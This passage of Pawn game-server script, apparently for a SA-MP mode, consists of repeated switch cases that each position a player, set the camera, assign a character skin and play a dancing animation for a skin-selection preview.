    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 60:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 78);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 78;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 61:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 79);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 79;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 62:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 80);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 80;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 63:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 81);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 81;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 64:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 82);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 82;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 65:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 83);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 83;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 66:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 84);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 84;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 67:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 88);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 88;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 68:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 91);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 91;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 69:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 94);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 94;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 70:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 95);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 95;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 71:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 96);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 96;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 72:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 97);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 97;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 73:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 128);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 128;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 74:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 129);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 129;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 75:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 130);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 130;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 76:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 132);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 132;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 77:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 133);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 133;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 78:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 134);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 134;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 79:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 135);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 135;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 80:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 136);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 136;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 81:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 137);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 137;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 82:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 142);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 142;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 83:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 143);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 143;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 84:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 144);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 144;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 85:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 155);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 155;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 86:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 156);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 156;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 87:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 157);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 157;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 88:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 158);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 158;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 89:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 159);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 159;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 90:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 160);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 160;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 91:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 161);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 161;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 92:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 162);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 162;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 93:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 167);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 167;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 94:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 168);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 168;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 95:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 170);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 170;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 96:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 176);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 176;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 97:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 177);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 177;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 98:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 179);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 179;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 99:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 180);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 180;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 100:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 181);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 181;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 101:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 182);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 182;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 102:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 183);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 183;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 103:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 184);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 184;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 104:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 189);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 189;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 105:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 191);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 191;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 106:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 193);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 193;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 107:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 196);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 196;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 108:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 197);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 197;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 109:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 198);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 198;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 110:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 200);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 200;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 111:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 201);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 201;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 112:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 202);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 202;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 113:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 209);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 209;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 114:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 210);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 210;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 115:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 212);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 212;
    SetPlayerFacingAngle( playerid, 0 ); SetPlayerVirtualWorld(playerid, 2);
    }
    case 116:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 215);
